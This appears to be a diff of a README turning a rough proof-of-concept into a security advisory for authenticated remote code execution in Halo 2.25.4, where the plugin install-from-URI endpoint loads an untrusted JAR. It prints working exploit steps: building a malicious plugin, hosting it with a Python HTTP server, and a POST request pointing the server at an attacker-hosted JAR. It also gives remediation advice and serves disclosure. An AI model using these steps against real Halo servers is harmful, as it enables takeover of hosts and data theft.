@@ -1,62 +1,94 @@
-# halo-2.25.4-exp
+# Technical Advisory: Authenticated Remote Code Execution (RCE) via Unvalidated Plugin URI Installation in Halo 2.25.4
 
-Deploy Halo 2.25.4 using Docker or Docker Compose
+## 1. Vulnerability Summary
 
-Hosting with a simple Python HTTP server
+A critical security vulnerability has been identified in Halo version 2.25.4. The application provides an administrative endpoint to install or upgrade plugins from a remote URI. However, the system fails to validate the source domain of the URI and lacks Server-Side Request Forgery (SSRF) protections on this specific component. An authenticated attacker with plugin management privileges can supply a link to a maliciously crafted plugin JAR file. The server will download, temporarily store, and dynamically load the JAR file into the JVM context using the PF4J framework and Spring's `DefaultPluginApplicationContextFactory`. This permits the execution of untrusted extension classes, resulting in arbitrary Remote Code Execution (RCE) on the underlying host operating system.
 
-python3 -m http.server 9999
+## 2. Vulnerability Details
 
-JAR access address: http://<your IP>:9999/poc-plugin.jar
+- **Vulnerability Type:** Code Injection / Remote Code Execution (RCE)
+- **CWE ID:** [CWE-94: Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html) / [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
+- **Severity:** 🔴 Critical
+- **Estimated CVSS v3.1 Score:** 9.8 (`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`)
+- **Affected Version:** Halo 2.25.4 (and potentially prior versions supporting URI-based plugin installation)
 
-Build a malicious plugin JAR：
+## 3. Affected Components
 
-cd halo-rce-poc
+Please separate with commas when submitting to the CVE form:
 
-chmod +x build-plugin.sh
+Plaintext
 
-./build-plugin.sh
+```
+PluginEndpoint.java, installFromUri method, DefaultPluginApplicationContextFactory
+```
 
-#### Vulnerability Description
+## 4. Attack Vector
 
-`PluginEndpoint` Provides an endpoint to install/upgrade plugins from a URI. After receiving the URI provided by the user, through `ReactiveUrlDataBufferFetcher` Download the JAR file and save it to a temporary file, then load it as a plugin using the PF4J framework. After PF4J loads it, Spring's `DefaultPluginApplicationContextFactory` Automatic instantiation `plugin.yaml` All the extended classes declared in the middle are Spring Bean。
+An authenticated administrator can send a crafted HTTP `POST` request containing a malicious remote plugin JAR URL to the `/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri` endpoint.
 
-#### Attack chain
+## 5. Technical Analysis & Attack Chain
 
-1. `PluginEndpoint.installFromUri()` Receive user URI (**no whitelist check**)
-2. `DefaultReactiveUrlDataBufferFetcher.fetch(uri)` Download JAR
-3. Write to a temporary file → `pluginService.install(path)`
-4. PF4J  `JarPluginLoader` Load JAR → `DefaultPluginApplicationContextFactory` Automatic registration of extension class
-5. Malicious class `static {}` block or `@PostConstruct` → `Runtime.exec()` → The server got taken over
+The remote code execution occurs through the following sequence of operations:
 
-#### Key code
+1. **Endpoint Ingestion:** The `PluginEndpoint.installFromUri()` method processes the incoming request body (`InstallFromUriRequest`) and extracts the `uri` string supplied by the user. There is no domain whitelist filtering applied.
+2. **Unprotected File Retrieval:** The extracted URI is passed to `DefaultReactiveUrlDataBufferFetcher.fetch(uri)`. Unlike other internal networking components in Halo, this fetcher does not invoke `HttpSecurityUtils.secureHttpClient()`, skipping internal private network/loopback IP restrictions (SSRF protection).
+3. **Local File Persistence:** The streaming content downloaded from the remote URI is written to a local temporary directory on the host server via `writeToTempFile(content)`.
+4. **Dynamic Class Loading:** The application passes the temporary path to `pluginService.install(path)`, which leverages the PF4J `JarPluginLoader` to unpack and load the JAR file.
+5. **Spring Bean Registration & Execution:** Once PF4J finishes loading the context, Spring's `DefaultPluginApplicationContextFactory` automatically parses the metadata inside the plugin's `plugin.yaml` and registers all declared extension classes into the application context as Active Spring Beans.
+6. **Code Execution Trigger:** Any malicious code placed inside the extension class's static initialization blocks (`static {}`) or method blocks annotated with `@PostConstruct` will be executed immediately during instance creation via `Runtime.getRuntime().exec()`.
 
-```java
-// PluginEndpoint.java:422-428
+### Vulnerable Source Code Segment (`PluginEndpoint.java` lines 422-428):
+
+Java
+
+```
 var content = request.bodyToMono(InstallFromUriRequest.class)
     .map(InstallFromUriRequest::uri)
-    .flatMapMany(reactiveUrlDataBufferFetcher::fetch);  // ← 从任意URI下载
+    .flatMapMany(reactiveUrlDataBufferFetcher::fetch);  // Unvalidated network fetch
 return Mono.usingWhen(writeToTempFile(content), pluginService::install, this::deleteFileIfExists);
 ```
 
-#### Impact Scope
+## 6. Proof of Concept (PoC)
 
-- An attacker with plugin management permissions can directly gain remote control of the server
-- Complete system compromise, data theft, lateral movement
+### Step 1: Host the Malicious Artifact
 
-Import plugin：http://192.168.49.128:8090/console/plugins
+The attacker compiles a standard PF4J/Halo plugin JAR file (`poc-plugin.jar`) containing an extension class with a payload execution mechanism inside a `@PostConstruct` lifecycle hook or static block. The attacker hosts it on an external listener:
 
-<img width="692" height="506" alt="image" src="https://github.com/user-attachments/assets/4282b8bb-a110-4708-bcca-13c0279abe2b" />
+Bash
 
-Returns 200, the plugin is installed
+```
+python3 -m http.server 9999
+```
 
-<img width="1874" height="730" alt="image" src="https://github.com/user-attachments/assets/8a1026e3-0d4c-4cb6-9573-8721dc170afe" />
-<img width="692" height="545" alt="image" src="https://github.com/user-attachments/assets/fb4fb9cf-f3e1-4eb3-9c61-0e0e7f3d5772" />
+### Step 2: Triggering the Vulnerability
 
-The logs show that the RCE was successfully triggered
+The authenticated administrative user sends the following HTTP request to the target Halo server:
 
-<img width="692" height="96" alt="image" src="https://github.com/user-attachments/assets/45fa62ac-1301-4215-82cb-048e48ca72bf" />
+HTTP
 
-Successfully saved to the server locally at /tmp/halo-poc-pwned.txt
+```
+POST /apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri HTTP/1.1
+Host: <target-ip>:8090
+Authorization: Bearer <ADMIN_TOKEN_HERE>
+Content-Type: application/json
 
-<img width="692" height="96" alt="image" src="https://github.com/user-attachments/assets/24c120ed-78dc-454b-bb81-f2e56dde40ea" />
+{
+  "uri": "http://<attacker-ip>:9999/poc-plugin.jar"
+}
+```
 
+### Step 3: Expected Result
+
+The server processes the installation, fetches the artifact from the attacker's server, registers the extension, and executes the compiled system command, compromising the target host.
+
+## 7. Impact
+
+- **System Compromise:** Full access to the hosting infrastructure or Docker container under the privileges of the application process.
+- **Data Theft:** Direct exposure of backend databases, sensitive application credentials, configuration keys (`application.yaml`), and stored files.
+- **Lateral Movement:** The server can be pivoted to attack inner site networks since the download mechanism can access loopback or internal infrastructure endpoints bypassing standard egress rules.
+
+## 8. Remediation Recommendations
+
+1. **Enforce Absolute Domain Whitelists:** Enforce strict validation rules on the incoming `uri` argument. Restrict remote installation schemas to verified, trusted official ecosystem marketplaces (e.g., `https://awesome.halo.run`).
+2. **Integrate Secure Fetchers:** Refactor `DefaultReactiveUrlDataBufferFetcher` to utilize the existing `HttpSecurityUtils.secureHttpClient()` utility to drop requests pointing to loopback (`127.0.0.1`), link-local (`169.254.169.254`), or private class networks (`10.0.0.0/8`, `192.168.0.0/16`).
+3. **Cryptographic Plugin Verification:** Implement a digital signature verification standard for external JAR modules. The `JarPluginLoader` context should validate file hashes or cryptographic signatures against public keys provided by the official repository before passing them to the `DefaultPluginApplicationContextFactory` for context instantiation.
